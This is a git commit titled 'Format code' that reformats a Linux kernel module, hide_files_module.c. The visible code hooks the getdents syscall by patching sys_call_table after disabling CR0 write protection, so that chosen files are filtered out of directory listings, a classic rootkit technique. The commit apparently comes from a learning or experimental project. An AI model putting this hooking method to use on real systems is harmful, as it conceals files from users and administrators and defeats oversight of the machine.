6b0fd65e3968731bd20b4b5a5d4985703f7fde86
IliyVas <vasiliy.kvm@gmail.com>
2020-04-11 19:49:50 +0300

    Format code

--- getdents_kernel_4.13.16/hide_files_module.c
+++ getdents_kernel_4.13.16/hide_files_module.c
@@ -12,17 +12,17 @@ MODULE_LICENSE("GPL");
 #define DIRENT_PART_SIZE (2* sizeof(unsigned long) + sizeof(unsigned short)) // size of the first 3 linux_dirent fields
 
 struct linux_dirent {
-    unsigned long	d_ino;
-    unsigned long	d_off;
-    unsigned short	d_reclen;
-    char		    d_name[1];
+    unsigned long   d_ino;
+    unsigned long   d_off;
+    unsigned short  d_reclen;
+    char            d_name[1];
 };
 
 unsigned long *sys_call_table = NULL;
-asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent*, unsigned int);
+asmlinkage int (*original_getdents)(unsigned int, struct linux_dirent *, unsigned int);
 
 inline void disable_write_protect(void) {
-    write_cr0(read_cr0() & (~ 0x10000));
+    write_cr0(read_cr0() & (~0x10000));
 }
 
 inline void enable_write_protect(void) {
@@ -55,27 +55,27 @@ asmlinkage int getdents_hook(unsigned int fd, struct linux_dirent *dirp, unsigne
             if (filtered_dirp != temp_dirp) {
                 memcpy(filtered_dirp, temp_dirp, temp_dirp->d_reclen);
             }
-            filtered_dirp = (struct linux_dirent*)((char*)filtered_dirp + filtered_dirp->d_reclen);
+            filtered_dirp = (struct linux_dirent *) ((char *) filtered_dirp + filtered_dirp->d_reclen);
         }
         remaining_bytes -= temp_dirp->d_reclen;
-        temp_dirp = (struct linux_dirent*)((char*)temp_dirp + temp_dirp->d_reclen);
+        temp_dirp = (struct linux_dirent *) ((char *) temp_dirp + temp_dirp->d_reclen);
     }
 
     return bytes_read;
 }
 
 static int __init hide_files_init(void) {
-    sys_call_table = (unsigned long*)kallsyms_lookup_name("sys_call_table");
-    original_getdents = (void *)sys_call_table[__NR_getdents];
+    sys_call_table = (unsigned long *) kallsyms_lookup_name("sys_call_table");
+    original_getdents = (void *) sys_call_table[__NR_getdents];
     disable_write_protect();
-    sys_call_table[__NR_getdents] = (unsigned long)getdents_hook;
+    sys_call_table[__NR_getdents] = (unsigned long) getdents_hook;
     enable_write_protect();
     return 0;
 }
 
 static void __exit hide_files_exit(void) {
     disable_write_protect();
-    sys_call_table[__NR_getdents] = (unsigned long)original_getdents;
+    sys_call_table[__NR_getdents] = (unsigned long) original_getdents;
     enable_write_protect();
 }
 
